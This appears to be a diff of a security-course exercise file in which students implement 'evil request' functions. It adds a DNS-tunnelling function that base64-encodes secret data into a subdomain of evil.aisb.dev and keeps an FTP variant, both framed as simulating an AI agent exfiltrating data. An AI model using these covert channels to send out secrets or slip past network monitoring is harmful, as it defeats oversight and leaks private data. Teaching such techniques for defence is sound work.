@@ -119,6 +119,8 @@ exfiltrate_data = make_evil_request_pinned
 
 # %%
 import ftplib
+
+
 def make_evil_request_ftp(secret_data: str) -> Optional[str]:
     """
     Send a request over FTP to ftp.scene.org with secret data.
@@ -137,8 +139,7 @@ def make_evil_request_ftp(secret_data: str) -> Optional[str]:
     #   3. Return the response text if successful, None otherwise
 
     try:
-
-        ftp = ftplib.FTP('ftp.scene.org', timeout=5)
+        ftp = ftplib.FTP("ftp.scene.org", timeout=5)
         ftp.login()
 
         dir_list = ftp.nlst()
@@ -147,12 +148,61 @@ def make_evil_request_ftp(secret_data: str) -> Optional[str]:
     except Exception as e:
         print(e)
         return None
-    
-    
+
+
 from w1d2_test import test_make_evil_request_ftp
+
 test_make_evil_request_ftp(make_evil_request_ftp)
 
 exfiltrate_data = make_evil_request_ftp
+
+
+# %%
+import dns.resolver as dns_resolver  # Alias to avoid conflict with mitmproxy.dns
+
+resolver = dns_resolver.Resolver()
+resolver.nameservers = ["8.8.8.8", "1.1.1.1", "127.0.0.1"]
+
+
+def make_evil_request_dns(secret_data: str) -> Optional[str]:
+    """
+    Send a DNS request to evil.aisb.dev to exfiltrate secret data.
+
+    This simulates an AI agent attempting to communicate using DNS queries.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the DNS query, or None if the request fails
+    """
+    # TODO: Implement the function to:
+    #   1. Construct a domain like secret_data.evil.aisb.dev (remember to encode secret_data with base64.urlsafe_b64encode)
+    #   2. Perform a DNS query for TXT records using resolver.resolve
+    #   3. Return the first TXT record found, or None if no records are found
+    try:
+        prefix = base64.urlsafe_b64encode(secret_data.encode()).decode()
+        url = f"{prefix}.evil.aisb.dev"
+        records = resolver.resolve(url, "TXT")
+        if len(records) > 0:
+            return records[0].to_text()
+    except dns_resolver.NXDOMAIN:
+        print("Domain does not exist")
+        return None
+    except dns_resolver.NoAnswer:
+        print("No answer recieved")
+        return None
+    except Exception:
+        print("DNS request failed.")
+        return None
+
+
+from w1d2_test import test_make_evil_request_dns
+
+test_make_evil_request_dns(make_evil_request_dns, resolver)
+
+# Set the exfiltration function for use in the exercise
+exfiltrate_data = make_evil_request_dns
 
 if __name__ == "__main__":  # Only executed when running the script directly
     """
